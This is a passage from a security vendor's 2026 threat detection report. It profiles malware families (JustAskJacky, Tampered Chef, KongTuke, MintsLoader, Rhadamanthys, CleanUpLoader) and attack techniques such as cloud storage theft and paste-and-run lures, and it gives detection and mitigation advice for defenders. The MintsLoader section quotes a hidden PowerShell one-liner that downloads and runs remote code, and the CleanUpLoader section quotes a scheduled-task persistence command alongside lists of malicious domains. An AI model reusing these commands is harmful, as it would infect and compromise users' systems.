from its heartbeat call (i.e., regularly intervalled
network connections intended as a check in)
and execute it via . This executed code
eval()
would not be written to disk.

2026 THREAT DETECTION REPORT 44
Signed malware How new is the certificate?
JustAskJacky’s malicious functionality Adversaries will often try to obtain new certificates,
is particularly tricky to identify because sometimes under other organization names, when their
it uses signed certificates, which often certificates get revoked. Whereas legitimate companies
give tools an air of legitimacy. However, often have years old certificates with a consistent signer
signed malware is becoming so common name, newer certificates could indicate malicious activity.
that volunteer efforts like Cert Central
have started to crowdsource reporting While the answers to these questions likely won’t confirm
these abuses. Evaluating the legitimacy malicious intent, combined with your organization’s risk
of a signer can be difficult, but a few tolerance and the context you have from the threat’s
key questions to answer during analysis telemetry, signer information can help tip the scales on
include the following. how much further you dig in.
Has this certificate been used to sign Several installer code-signing certificates with valid dates
multiple unrelated files and do those were revoked after JustAskJacky distribution.
files have multiple names despite
advertising the same functionality? Revoked installer code-signing certificates
Some adversaries will use the same
certificate to sign malware files that Issuer Subject Valid from Valid to Thumbprint
use a variety of file lure names. (e.g.,
something like , , Sectigo Public App 3ebbb02a48f7d
BestPDF LoveSudoku Code Signing Interplace b26b708f5e535e
or FreeVideoGame ). The corollary is CA EV R36 LLC 2025/01/22 2028/01/22 8dce8eff2caea
also true: If there are a ton of
BestPDF.
exe files with multiple unrelated signer Sectigo Public 2d4129109dbf92
names, it is likely the adversary using Code Signing Pixel Catalyst 1db0bc48d41da
CA EV R36 Media LLC 2025/01/17 2028/01/17 32da0ff1bf024
a new certificate and the same
filename lure.
Sectigo Public Method 5b036dad04db22
Code Signing Marketing e8560716deabc5
Do the signer name (generally a CA EV R36 Media LLC 2025/06/25 2026/06/25 9a5e524b6be2
company name) and the filenames
make sense together? Is the signer’s Sectigo Public 2b0a08ccefd7355
Code Signing Fusion Core
name overly vague? CA EV R36 Reach LLC 2025/03/14 2026/03/14 207780ee21e69b8
a7fa3c0750
There is sometimes a mismatch between
Sectigo Public 2df81ab14a5794f
the company name and the expected Code Signing DataX Engine 22722983ab3d8e8
CA EV R36 LLC 2024/07/19 2025/07/19 d7d643908b
functionality of the file. (e.g., filename:
, company name: Tina’s
FreePDF.exe
Turtles LLC).
If you search the signer name and get
Take action
multiple results because it is so generic
and none of them seem like they would
have made this software, that is a red Visit the JustAskJacky threat page for detection
flag. The caveat to this is that many of opportunities and relevant atomic tests to validate
these SEO schemes do come with very your coverage.
generic websites, so this requires some
analyst judgement. Threats like JustAskJacky can be hard to mitigate.
They don’t show their true nature right away, making
them hard to distinguish from benign freeware installations.
The best defense, though most challenging, is restricting
application installs and downloads and providing users
with known safe software for their job function.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 4455
#3 OVERALL
RANK
Tampered Chef
6.1% CUSTOMERS
Using steganography for communications, AFFECTED
Tampered Chef demonstrates how seemingly
legitimate apps can hide things in network traffic.
Analysis
Tampered Chef is an Electron -based
Node.js
threat designed to process steganographic content
delivering arbitrary JavaScript code alongside
legitimate content. The threat leverages this
steganographic content to deliver commands for
stopping Google Chrome processes, restarting
Chrome to make it visit arbitrary pages, and
changing the default search engine or opening new
tab pages to adversary-controlled websites.
The first iteration of Tampered Chef, observed
Visit the Tampered
by Red Canary in June 2025, posed as a
Chef threat page
“RecipeLister” application that leveraged the
legitimate open-source TheMealDB API to to see an example
deliver recipes in an attractive interface. of steganographic
content we observed
during our analysis.
During execution, the RecipeLister application
would decode the invisible and
Screenshot of RecipeLister application \u200b \u200c
characters into arbitrary JavaScript that would
run in . While it didn’t occur often in
Node.js
As we analyzed the RecipeLister application, we our data, community malware analysts noted
uncovered behavior showing that Tampered Chef’s that Tampered Chef would eventually cause the
command and control server did serve legitimate Chrome web browser to spawn and visit arbitrary
recipes but the recipe content was mixed together web pages, possibly also inducing search engine
with steganographic content. installation and new tab page changes.

2026 THREAT DETECTION REPORT 46
The steganographic content tactic extended into a new Tampered Chef campaign in September 2025 with
a new fake application named “Calendaromatic.” Additional analysis published by Guidepoint Security
showed the application again used invisible characters for steganography in a slightly different scheme
from the original RecipeLister campaign.
Code snippet courtesy of Guidepoint Security
There is no apparent targeting for Tampered Chef installations; the threat is opportunistic and has been
observed across many organizations in many industries.
Readers should note that Red Canary defines our observations of Tampered Chef narrowly to RecipeLister
and Calendaromatic. Other public reporting has tied Tampered Chef tracking to additional threats like
JustAskJacky, AppSuite, and Browser Assistant. We track Tampered Chef separately from these threats
as we’ve observed specific steganography use in Tampered Chef that was not present in the other apps.
We’re not the only ones, either, as Expel has taken a similar approach.
Take action
Visit the Tampered Chef threat page for Organizations that want to specifically block
detection opportunities and relevant atomic tests known Tampered Chef instances can implement
to validate your coverage. application control solutions to block by digital
signature. For this threat, organizations can
Preventing Tampered Chef from executing can block executables with digital signatures of
be difficult, as it does not require administrator and .
CROWN SKY LLC Global Tech Allies ltd
privileges for execution and does not always
always exhibit behaviors to make Chrome
browsers visit web pages. Generic IT hygiene
steps such as implementing advertisement
blocking, providing safe locations for software
downloads, and maintaining an approved software
list can help make installation of Tampered Chef
less likely by users seeking applications.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 4477
#7 OVERALL
RANK
KongTuke
3.1% CUSTOMERS
A malicious traffic distribution system, KongTuke AFFECTED
uses compromised WordPress sites to deliver
ever-evolving lures to unsuspecting users.
Analysis
KongTuke (aka Chaya_002/
LandUpdate808/TAG-124) is a traffic
distribution system (TDS) that uses
compromised WordPress sites to deploy
malicious code. Traffic distribution
systems are often used legitimately;
they are platforms designed to filter
and redirect network traffic, and were
originally developed for use by digital
advertisers. That said, they have since
been abused by adversaries to such a
degree that the phrase “malicious TDS”
could be considered redundant.
Adversaries leverage
TDS infrastructure to:
Malicious traffic distribution systems use compromised
Put malicious ads and lures websites to redirect traffic and execute malicious code
in front of as many potential
victims as possible
Adversaries deploy extensive TDSs, like KongTuke, that
navigate victims through a tangled network of domains.
The content delivered ranges from outright malicious to
Attempt to evade detection by ad-revenue-focused, or even legitimate content
obfuscating their operations strategically placed to evade researchers.
via frequent web redirects
First publicly reported in May 2024 and named for an
early C2 domain it used, , KongTuke
kongtuke[.]com
is one such TDS. One of its key identifiers is leveraging
compromised WordPress sites that display JavaScript
Route users to malicious
pop-ups to trick visitors into downloading and executing
content even if some of the
payloads. The compromised websites are injected with
infrastructure is blocked
malicious JavaScript code intended to trick the user into
downloading malicious payloads through a variety of lures.

2026 THREAT DETECTION REPORT 48
A banner year for KongTuke KongTuke has been linked to ransomware,
including Rhysida and the Interlock ransomware
KongTuke and the lures it distributes have changed group. We’ve observed various groups and
over time. When we first started tracking KongTuke malware families successfully execute
prior to 2025, the injected code would display KongTuke, including:
fake Chromium browser update landing pages.
In January 2025, researchers reported KongTuke • D3F@ck Loader
websites using the fake CAPTCHA variant of paste • LummaC2
and run (aka ClickFix) to trick users into executing • MintsLoader
malicious code and downloading payloads, which • Mocha Manakin
Red Canary also observed. • WARMCOOKIE
In April 2025, KongTuke reportedly used the
“FileFix” version of paste and run as well. Red
Canary noted a lull from May through July before
activity picked back up again, reaching a second
peak in September before decreasing toward the
Take action
end of the year. In November and December 2025,
Red Canary and other researchers observed
KongTuke distributing paste-and-run lures that
leveraged .
finger.exe
Visit the KongTuke threat page for detection
opportunities and relevant atomic tests to
KONGTUKE ACTIVITY IN 2025 validate your coverage.
Red Canary does not have visibility into the
entire KongTuke intrusion chain. Many users
may encounter the compromised WordPress
websites during the course of normal browsing
without interacting with the lures displayed
by KongTuke pages and executing their
code. Because KongTuke uses multiple lures
and delivers a variety of payloads, relevant
endpoint behaviors may appear in different
ways, depending on the payload.
Attribution to KongTuke can be made via
OSINT reporting of compromised domains
Execution chain or by pivoting to analyze the JavaScript
references on compromised sites, for example
When users access an infected KongTuke <script async=”” src=”{malicious
website, adversary-controlled resources are JavaScript}”> . Also, server-side JavaScript
loaded silently, resulting in the fake landing filenames may follow the pattern of {digit}
pages popping up. When users interact with {letter}{digit}{letter}.js , like 6t4r.js
the lures—for example, if they click on the or 5t6y.js .
“Update Chrome” button on the landing
page—a malicious payload with a filename For threats like KongTuke that rely on
like or deceiving users into interacting with their
update_28_05_2024_9921804.exe
is downloaded lures, user education can be helpful in
ChromeUpdateInstaller.js
to the victim’s device, followed by additional preventing initial access.
payload-dependent activity, if not stopped
and remediated.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 4499
#9 OVERALL
RANK
MintsLoader
2.0% CUSTOMERS
MintsLoader is a multi-staged, obfuscated PowerShell AFFECTED
loader that uses JavaScript to drop a variety of payloads.
Analysis of an obfuscated version of the first-stage
MintsLoader PowerShell command. Once
deobfuscated, the script uses to download
MintsLoader is a PowerShell-based malware curl
the next stage from a DGA domain with the
loader that uses JavaScript and PowerShell .top
top-level domain.
to download and execute additional payloads,
including StealC, Vidar, and AsyncRAT. The threat
JavaScript lures
is characterized by a URL that contains ,
1.php?s=
where the parameter referenced after the equal
We also observed another initial access cluster
sign is a campaign identifier.
that, like SocGholish, relied on malicious
JavaScript lures. In some instances, this cluster
used language specific lures like (Italian
Red Canary observed at least three distinct Fattura
for “invoice”), followed by 8 digits, for example:
clusters of activity delivering MintsLoader in 2025.
Fattura26940207.js.
Paste and run with KongTuke
In other instances, lures followed in the
footsteps of 2024 SocGholish and Scarlet
By far the most frequent is a cluster of paste-and-
Goldfinch behavior, using the name .
run activity associated with KongTuke. In this update.js
The JavaScript contents often contained large
cluster, users are urged to copy the MintsLoader
amounts of text, often excerpted from the same
first-stage PowerShell command directly into the
book, to obfuscate the code used to call the
Windows run dialog. For example:
MintsLoader first stage.
Malware details
powershell -WindowStyle Hidden
$global:block=curl -useb hxxp[://]
lalclenfjhkinbn[.]top/1.php?s=527;iex MintsLoader typically operates in three stages:
$global:block.content
STAGE 1 Initial download
The command would then directly down
curl
the MintsLoader second stage and continue the
STAGE 2 System information discovery
execution chain.
SocGholish
STAGE 3 Payload execution
Another cluster of activity includes SocGholish,
this year’s 8th most prevalent threat, delivering
MintsLoader. This cluster begins with initial
Visit the MintsLoader threat page for detailed
execution of the SocGholish fake update
malware analysis of all three execution stages.
JavaScript, and, within seconds, execution

2026 THREAT DETECTION REPORT 50
Take action
Visit the MintsLoader threat page for detection
opportunities and relevant atomic tests to validate
your coverage.
Much like with SocGholish, the JavaScript initial
access clusters associated with MintsLoader can
be mitigated by using a group policy object (GPO)
to change the default behavior in Windows to open
JS files with Notepad or another editor.
Additionally, a similar GPO mitigation strategy
can be applied with paste and run, disabling
Windows Hotkeys for users. However, since the
use of Windows hotkeys is a popular feature, user
education may be a more frictionless alternative.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 5511
#10 OVERALL
RANK
Rhadamanthys
1.6% CUSTOMERS
While Rhadamanthys stealer grew popular after AFFECTED
the LummaC2 takedown, it soon fell victim to
Operation Endgame.
Analysis banned from hacking forums for not restricting
the stealer from executing in Commonwealth of
Independent States (CIS) countries. This restriction
Rhadamanthys is a commercially distributed
is common among malware developers to avoid
stealer family that first appeared in underground
law enforcement attention in Russia.
markets around late 2022 and has since evolved
through multiple versions. Sold as a MaaS offering,
For capabilities, Rhadamanthys has a
it gives even novice adversaries easy access
comprehensive list of applications from which
to credential theft at scale. Like LummaC2,
it can take passwords and other credentials.
Rhadamanthys offers multiple price points for
In an article where Check Point Research referred
adversaries seeking to buy licensing and support
to Rhadamanthys as the “everything bagel,”
for the stealer and related infrastructure.
researchers reported the stealer supports not
only all major browser families but even some
Rhadamanthys is a modular platform, which allows
with very few users. In addition, the developers
its developers to actively maintain and extend its
extended support for stealing credentials from
capabilities to evade detection. During 2025, the
browser extensions with as little as one registered
popularity of Rhadamanthys boomed shortly after
user at the time.
international law enforcement actions against
LummaC2 infrastructure as adversaries sought
Because it steals credentials from many different
other stealer malware for operations.
products, Rhadamanthys can facilitate breaches
at organizations of all sizes and industries.
This popularity continued until November 2025
when international law enforcement agencies took
action to take down Rhadamanthys’s infrastructure An autumn burst
and seize systems as part of Operation Endgame.
August through October 2025 showed the most
Rhadamanthys activity in our data, replacing
The “everything bagel” of stealers
LummaC2 during that time. During the year,
one third of our Rhadamanthys threats were
Since Rhadamanthys is a MaaS offering, many
distributed via paste and run.
different adversaries may buy the malware and
use it against a plethora of targets. Rhadamanthys
For co-occurrances, Rhadamanthys was
itself may be found across systems in many
sometimes combined with CypherIT,
different countries and industries. Red Canary
HijackLoader, or LummaC2. HijackLoader
observed this opportunistic distribution in 2025 as
and CypherIT were presumably used to help
adversaries adapted to deploying Rhadamanthys
deliver Rhadamanthys while evading defenses,
as payloads for paste-and-run activity after the
whereas its combination with LummaC2 in one
LummaC2 takedown.
case could indicate that the adversary who
gained access either ran multiple stealers or
This lack of targeting has even proven troublesome
allowed the access to be reused by another
for the Rhadamanthys developer, as they were
adversary with the second stealer.

2026 THREAT DETECTION REPORT 52
RHADAMANTHYS ACTIVITY OBSERVED IN 2025
ASN NAMES USED BY RHADAMANTHYS IN 2025
In terms of network infrastructure,
Red Canary processed 283
IP address indicators for
Rhadamanthys in 2025. Taking a
look at the autonomous system
numbers (ASNs) for those IP
addresses, Rhadamanthys used at
least 97 different network providers
during the year, stretching from
legitimate providers to less savory
ones. In fact, 34 of those 97 ASNs,
or 35 percent, spent at least some
time on the Spamhaus Do Not Route
or Peer (DROP) list, indicating that
the traffic from those sections of
the internet were more likely to be
fraudulent than not. To see which
network providers were the most
popular, refer to the list of the ASN
names and numbers to the right.
In cases where Rhadamanthys used
SSL/TLS for command and control,
the infrastructure nearly exclusively
used self-signed certificates.

2026 THREAT DETECTION REPORT 53
Take action
Visit the Rhadamanthys threat page for Response
detection opportunities and relevant atomic tests
to validate your coverage. For response, an excellent playbook would look
something like this:
Since Rhadamanthys has been distributed
in so many different ways, preventative 1. Delete all components delivering
measures can take many approaches. Rhadamanthys from disk, removing
We’ve observed Rhadamanthys distributed persistence
in fake software installations, paste-and-run
campaigns, and more. 2. Determine what account details are stored in
the software on an affected system, including:
General preventative measures that apply
browsers
to multiple malware families also help fight
file transfer software like FileZilla and
against Rhadamanthys:
WinSCP
Telegram messaging
• Provide safe software installation
Steam gaming
sources for users.
cryptocurrency wallets
• Configure ad-blocking tools where possible.
VPN profiles
• Deploy endpoint security controls for detection
cloud credentials in CLI tool configuration
and protection.
sensitive files stored in the user’s Desktop
and Documents folders
3. Once you determine the scope of data theft,
take steps to reset any credentials stored on
the system. This may also involve manually
revoking sessions to prevent cookie reuse.
Finally, if financial details such as payment cards
or cryptocurrency wallets are stored on the
affected system, users may need to monitor the
relevant accounts for unauthorized transactions.
For endpoint process behaviors, Rhadamanthys is similar to other stealers in the sense that it emits precious
little telemetry on its own. But when combined with crypters, loaders, and paste-and-run techniques, it
can produce a variety of behaviors that are detectable.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 5544
#10 OVERALL
RANK
CleanUpLoader
1.6% CUSTOMERS
Delivered in SEO poisoning and malvertising AFFECTED
campaigns, CleanUpLoader masquerades as
legitimate software utilities such as PuTTY
and WinSCP.
CLEANUPLOADER EXECUTION CHAIN
Analysis
CleanUpLoader, also known as Oyster Loader
or Broomstick, is a backdoor and malware loader
designed to maintain persistence and deliver
additional payloads. The loader is typically
signed, with researchers having linked the
use of the certificate and the malware to
adversaries deploying Rhysida ransomware.
CleanUpLoader campaigns in 2025 favored
masquerading using the brands of PuTTY,
WinSCP, and MSTeams, using SEO poisoning
and typosquatting to lure unsuspecting users
to download the malware masquerading as
the legitimate utility.
Execution of the loader starts with an executable
that drops a malicious dynamic link library (DLL),
typically to a randomly named folder in the
user’s directory. Observed
AppData\Roaming
folders have 12-15 random alphanumeric
characters, sometimes with a special
character as the last character.
Examples include:
dmqxuvy4d1sc¶
zm7vaanqh05jiyy
3sjikzdzrn0o{

2026 THREAT DETECTION REPORT 55
The executable also establishes persistence
of the DLL by creating a scheduled task to
execute the DLL using rundll32.exe with Take action
as the entry point
DLLRegisterServer
for execution. CleanUpLoader uses the
utility to accomplish this:
schtasks.exe
Visit the CleanUpLoader threat page
for detection opportunities and relevant
C:\Windows\System32\schtasks.exe /Create atomic tests to validate your coverage.
/SC MINUTE /MO 18 /TN “WindowsCodecs”
/TR “C:\Windows\System32\rundll32. Users of common administrative utilities
exe C:\users\<user>\AppData\Roaming\ should take care to download their tools
Zm7VAanQH05JiYy\WindowsCodecs.dll
from a legitimate and authorized source.
DllRegisterServer”
One way to do this is to check the domain
of the landing page. Victims of CleanUpLoader
campaigns often visited websites that
contained the name of the tool, but with
Observed scheduled task names include: suspicious domains. Examples of malicious
domains for the campaign related to fake
PuTTY include:
WindowsCodecs
•
putty-ssh[.]com
•
putty[.]run
BluetoothDesktopHandlers
•
putty-download[.]fmwyd[.]com
•
puttylime[.]shop
Security Updater
•
putty-app.naymin[.]com
•
putty-download[.]gblec[.]com
WMSysPr9 •
puttyonline[.]org
•
puttyy[.]com
•
FireFox Agent INC puttya[.]com
•
putty-download.yapof[.]com
•
putty-download.macpav[.]com
The backdoor includes functionality to allow •
putty-pc[.]com
operators to execute arbitrary commands on the
•
host. Malware operators have issued domain and putty-go[.]com
network discovery commands to further enumerate •
putty-cn[.]com
the victim environment. These commands include
the use of: In addition, controls to block advertisements
on enterprise systems can help prevent users
•
net from seeing ads serving this content. These
•
nltest controls may include browser extensions such
•
systeminfo as uBlock or DNS sinkhole technologies.
•
ipconfig

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 5566
The purpose of this section is to help you detect techniques whenever possible, allowing us to
malicious activity in its early stages so you don’t associate the behaviors that comprise a confirmed
have to deal with the consequences of a serious threat detection with the industry standard for
security incident. classifying adversary activity.
The following chart represents the most When counting techniques, we filter out detections
prevalent MITRE ATT&CK® techniques observed associated with potentially unwanted programs
in confirmed threats across the Red Canary and authorized testing in order to make this list as
customer base in 2025. To briefly summarize reflective of actual adversary behavior as possible.
what’s explained in detail in the Methodology
section, we have a library of thousands of
detection analytics that we use to surface
In addition to the top 10, read our analysis
potentially malicious and suspicious activity
of featured technique Steal Application
across our customers’ environments. These
Access Token.
custom detectors and third-party alerts are
mapped to corresponding MITRE ATT&CK
TOP TECHNIQUES DETECTED IN 2025

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 5577
What’s included in this section
This PDF spotlights three MITRE ATTACK
techniques, covering how and why adversaries
leverage them and relevant mitigation advice.
You can view the full analysis of all of the top
10 techniques—including visibility, collection,
detection, and testing guidance—in the web
version of this report.
How to use our analysis
Implementing the guidance in this report will
help security teams improve their defense in
depth against the adversary actions that often
lead to a serious incident. Readers will gain a
better understanding of common adversary
actions and what’s likely to occur if an adversary
gains access to your environment. You’ll learn
what malicious looks like in the form of telemetry
and the many places you can look to find that
telemetry. You’ll gain familiarity with the principles
of detection engineering by studying our detection
opportunities. At a bare minimum, you and your
team will be armed with hyper-relevant and
easy-to-use Atomic Red Team tests that you
can leverage to ensure that your existing security
tooling does what you think it’s supposed to do.
More strategically, this section can help you
identify gaps as you develop a road map for
improving coverage, and you can assess your
existing sources of collection against the ones
listed in this report to inform your investments
in new tools and personnel.

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 5588
#4 OVERALL
RANK
Data from
Cloud Storage 5.5% CUSTOMERS
AFFECTED
Adversaries target cloud storage to achieve two
659 THREATS
primary goals: steal credentials and exfiltrate or
DETECTED
destroy sensitive data for ransomware operations.
Analysis How do adversaries abuse data
from cloud storage?
Why do adversaries abuse data from Goal 1: Credential theft for brokering access
cloud storage?
The most common adversary goal is to discover
Most often, a business’s “crown jewels” are and extract credentials from cloud storage.
the data that exists all throughout the enterprise, This represents a lower-effort, high-reward attack
which is ever shifting to the cloud. If adversaries pattern that has fueled the growth of initial access
are not directly defrauding companies through brokers—threat actors who specialize in obtaining
business email compromise or other direct and selling access to compromised environments.
payment schemes targeting cloud-hosted
systems, they target cloud storage. Adversaries Storage that may contain credentials includes:
may be directly hunting for credentials in cloud
storage—API keys, access tokens, passwords, • Configuration files: Application config files
and others—that they can either use themselves containing database passwords, API keys,
or sell. They also target sensitive organizational and service credentials
data for exfiltration and ransomware operations, • Infrastructure-as-code repositories:
demanding payment in exchange for not Terraform state files, Ansible playbooks, and
releasing stolen data or for restoring access CloudFormation templates with embedded secrets
to destroyed resources. • Backup archives: Complete system backups
containing credential stores, SSH keys, and
The reason adversaries target credentials in certificate private keys
cloud storage is simple: it’s much easier to • Development artifacts: Source code repositories
log in than to hack in. Rather than investing with hardcoded credentials, .env files, container
resources in developing sophisticated exploits images, and credential caches
or bypassing advanced security controls, threat • Virtual machine (VM) snapshots and
actors recognize that credentials are ubiquitous disk images: Filesystem snapshots containing
across cloud storage environments. Configuration credential stores, browser password databases,
files, backup archives, source code repositories, and SSH keys
infrastructure-as-a-service (IaaS) snapshots, and • Log files: Application logs inadvertently
development artifacts regularly contain hardcoded capturing authentication tokens or credentials
credentials, access keys, and authentication • SaaS applications: Services such as GitHub, Jira,
tokens. A single exposed AWS S3 bucket or Azure Slack, Teams, Confluence, Google Workspace or
Storage block can yield valid credentials. other productivity applications that may contain
sensitive conversations where users
share credentials

2026 THREAT DETECTION REPORT 59
This attack pattern requires minimal infrastructure Cloud storage services are designed for massive
and technical sophistication. Adversaries use scale and rapid data transfer—exactly the
automated scanning tools to discover publicly features adversaries exploit during exfiltration
accessible storage accounts, then employ operations. In Storm-0501 campaigns, the threat
simple scripts to search for common credential actor uses AzCopy, Microsoft’s own command-
patterns—AWS access keys, Azure connection line utility for efficient data transfer, to quickly
strings, database passwords, and API tokens. This exfiltrate large volumes of sensitive data to
attack pattern is so prevalent that there are entire adversary-controlled infrastructure within Azure.
repositories dedicated to tracking these types of This approach provides several advantages for
incidents over the past decade. threat actors:
Goal 2: Data exfiltration and • Speed: Cloud-native transfer tools enable
ransomware operations exfiltration of large volumes of data quickly.
The second adversary goal builds on the first: • Legitimacy: Using native cloud tools like
using compromised credentials to access, , ,
AzCopy Azure Storage Explorer (ASE)
exfiltrate, and potentially destroy sensitive , and makes malicious activity
aws-cli gsutil
organizational data for financial extortion. This blend with normal operations.
pattern has evolved significantly with the rise of
cloud-based ransomware, where adversaries • Minimal footprint: No malware deployment
leverage cloud-native capabilities rather than required, reducing detection opportunities.
deploying traditional encryption malware.
When protections like Azure resource locks or
Threat actor group Storm-0501 exemplifies immutability policies prevent deletion, the threat
this evolution. The group transitioned from actor adapts by encrypting storage accounts
traditional on-premises ransomware operations with customer-managed keys, such as SSE-C
to sophisticated cloud-based attacks that in AWS, which prevents recovery by the cloud
combine data exfiltration with data destruction. service provider. The flexibility of cloud platforms
Their campaigns demonstrate how adversaries that benefits organizations equally serves
target cloud storage. adversaries who understand how to manipulate
cloud-native features for destructive purposes.
HOW TRADITIONAL RANSOMWARE OPERATIONS EVOLVED TO CLOUD-BASED EXTORTION

2026 THREAT DETECTION REPORT 60
HOW ADVERSARIES OBTAIN ACCESS TO DATA FROM CLOUD STORAGE
How do they achieve these goals?
1. Establish access
Adversaries obtain cloud storage access through common cloud attack patterns:
• Initial access: • Reconnaissance:
Adversaries may leverage enumeration tools
Hybrid identity exploitation: like AzureHound to document available and
Storm-0501 compromises on-premises utilized storage services. This allows them to
Active Directory environments, then then narrow down the subsequent steps to
pivots to cloud by exploiting Microsoft limit the chance of detection.
Entra Connect Sync servers. These hybrid
identity synchronization systems bridge • Privilege escalation:
on-premises and cloud environments, After gaining initial cloud access,
providing adversaries a pivot point. adversaries attempt to escalate privileges
to Global Administrator (Entra ID) or other
Exposed credentials: admin roles, providing unrestricted access
Adversaries may purchase credentials to storage resources.
from other access brokers or otherwise
exploit exposed credentials in public • Access key theft:
spaces. Using privileged roles, adversaries extract
storage account access keys via API actions,
enabling direct storage access.

2026 THREAT DETECTION REPORT 61
2. Prepare for exfiltration Comparison of data from cloud storage theft
across platforms
Adversaries may modify storage configurations
to enable data theft. The most common method This technique primarily applies to any cloud
is to enable public access. This can be done provider that offers the ability to store data
directly with access control policies or on the platform, with AWS, Microsoft Azure,
it may take the form of network changes such and Google Cloud Platform (GCP) being the
as security rule changes or disabling firewalls. main providers. Below are the platforms and
a non-exhaustive list of potential services
Though, as defenders become more familiar with that may be targeted by adversaries.
this technique, adversaries may only allow access
to third-party cloud environments that they
control. This allows them to evade detection in
Platform Services
large environments where cross-account sharing
is more common. Furthermore, they may have to
remove immutability locks on the data before they
AWS S3, EBS, EFS
can modify lifecycle rules or otherwise encrypt the
data for impact.
Azure Azure Storage: Blob, Table, Queue,
File, disk snapshots
3. Get the goods
Using compromised credentials and modified
GCP Google Cloud Storage,
configurations, adversaries leverage native tools
disk snapshots
for mass exfiltration. For example, Storm-0501
uses AzCopy to rapidly transfer Azure Storage
data.
Beyond the major cloud service providers, SaaS
To maximize extortion leverage, adversaries
applications present another major risk for storing
systematically destroy recovery options:
sensitive data. The Salesloft Drift compromise
in 2025 highlights that access credentials that
• Primary data deletion: Mass-delete storage
are stored for third-party integrations are a prime
accounts, S3 buckets, or cloud storage buckets
target for adversaries and that all threat vectors
should be considered.
• Backup destruction: Target Azure Recovery
Services vaults, AWS backup vaults, or
snapshot repositories
Sometimes, adversaries may simply exploit
misconfigurations in cloud environments and
access data from unintended public access.
This has become so common that there are
several lists dedicated to documenting
publicly accessible cloud storage. “The most effective defense
against credential theft is
ensuring credentials never
enter cloud storage.”

2026 THREAT DETECTION REPORT 62
Take action
Visit the Data From Cloud Storage technique Scan for exposed credentials
page to explore:
Implement automated scanning to detect
• relevant MITRE ATT&CK data sources credentials in cloud storage:
• log sources to expand your collection
• detection opportunities you can tune to • Pre-commit hooks: Scan source code for
your environment credentials before committing to repositories.
• atomic tests to validate your coverage • Storage scanning: Use tools like git-secrets,
TruffleHog, or cloud-native solutions (Azure
Defender for Storage, AWS Macie) to scan
Prevention techniques generally fall into the same existing storage for common credential
two goals that the adversaries target: patterns. Refer to Data from Information
Repositories for a robust list of credential
1. Protect credentials. locations.
2. Implement data loss prevention (DLP) • Continuous monitoring: Regularly scan
for sensitive business data. storage accounts for newly uploaded files
containing credentials.
• Remediation workflows: Automatically rotate
Protect credentials
or revoke credentials discovered in storage.
The most effective defense against
credential theft is ensuring credentials Infrastructure-as-code (IaC) security
never enter cloud storage.
For IaC deployments, avoid embedding credentials
Adopt secrets management solutions in state configuration files. Use cloud provider
parameter stores for secrets in CloudFormation,
Use AWS Secrets Manager, Azure Key Vault, ARM templates, or Terraform so you can
Google Secret Manager, or 1Password instead of implement runtime secret availability rather than
storing credentials in configuration files or code. hardcoded values. Finally, scan IaC repositories
Applications retrieve credentials programmatically and state files for embedded credentials.
at runtime rather than storing them in storage
accounts. In reality, it is not feasible to successfully
remove all credentials from your environments.
Enable short-term credentials Adversaries, if persistent enough, will always find
a way to harvest them. Therefore, beyond all the
Wherever possible, enable short-term credentials above techniques to prevent credential disclosure,
that get refreshed in short intervals. This will help it is imperative to properly adhere to zero trust
limit the amount of time an adversary has access principles and defense-in-depth strategies to
to a cloud environment. ensure that when compromises happen they
have a limited time duration and blast radius.

2026 THREAT DETECTION REPORT 63
Take action
Prevent data exfiltration
and ransomware
A sufficiently persistent adversary may bypass
most security controls. However, below are
some suggestions for good strategies to limit or
otherwise make adversary goals more difficult for
ransomware and extortion campaigns.
Immutability protections
Storm-0501 could not delete storage accounts
protected by immutability policies, forcing the
adversary to resort to encryption attacks:
• Azure: Implement immutability policies on
Blob Storage with appropriate retention
periods; enable version-level immutability
for granular protection.
• AWS: S3 has several options to protect data,
such as Object Lock and versioning.
• GCP: Enable bucket retention policies and
object versioning.
Backup segregation
Store backups separately from
production storage:
• Use different cloud accounts or subscriptions
for backup storage.
• Apply separate IAM policies so production
access doesn’t grant backup access.
• Implement Azure Blob backup,
AWS cross-account replication, or GCP
bucket snapshots to protected projects.
• Enable soft-delete for Azure Key Vaults
to prevent encryption key deletion
(90-day retention).

22002266 TTHHRREEAATT DDEETTEECCTTIIOONN RREEPPOORRTT 6644
#8 OVERALL
RANK
Malicious Copy
and Paste 13.9% CUSTOMERS
AFFECTED
In many ways, 2025 was the year of a social
448 THREATS
engineering attack known as “ClickFix” or “paste
DETECTED
and run” that begins with tricking users to copy
and paste malicious code.
Analysis PASTE AND RUN, STEP BY STEP
Why do adversaries use malicious
copy and paste?
Attacks leveraging malicious copy and paste
can take several forms but at its core, this
technique relies on a user copying and pasting
code to their system’s command-line interface,
taking the form of CAPTCHA-style messages or
“fix” requests in order for the adversary to gain
execution. While this technique goes by several
names— including ClickFix and fakeCAPTCHA—
Red Canary Intelligence uses the term “paste
and run” to describe these attacks internally.
This technique takes advantage of a user’s
digital conditioning—instead of feeling tricked,
users believe they’re fixing a technical issue—
helping the adversary bypass mitigations designed
to protect users and circumventing mechanisms
that block malicious actions.
While plenty of threat actors employed
this technique in 2024, Red Canary observed
paste-and-run attacks increase in scope and
scale in 2025. The technique has grown in
popularity over the past year because it’s
been extremely effective.

2026 THREAT DETECTION REPORT 65
How do adversaries use malicious copy and paste?
Paste and run has quickly become the second most popular initial access vector for cyber attacks, trailing
only traditional phishing. This technique, which traditionally downloads follow-on payloads from adversary
infrastructure, relies heavily on urgency. The adversary is trying to entice the user into verifying or fixing
something by typing a command into a terminal, run dialog box, or PowerShell. The lures can often feel
time-sensitive and users may feel like they need to act fast to solve the problem.
PASTE-AND-RUN LURES CAN LOOK LIKE ANY OF THESE EXAMPLES
What to look for:
• Verification or
fix that involves
opening a terminal,
run box, or
PowerShell
• Shortcuts that
include the
Windows button
and “R” or “X”
• Any verifications
that ask you
to paste (Ctrl + V)
something unknown
Red Canary has seen lures take several forms, Over the last year, Red Canary has detected
including ones in which: adversaries leveraging this technique to deliver a
wide range of threats, including but not limited to:
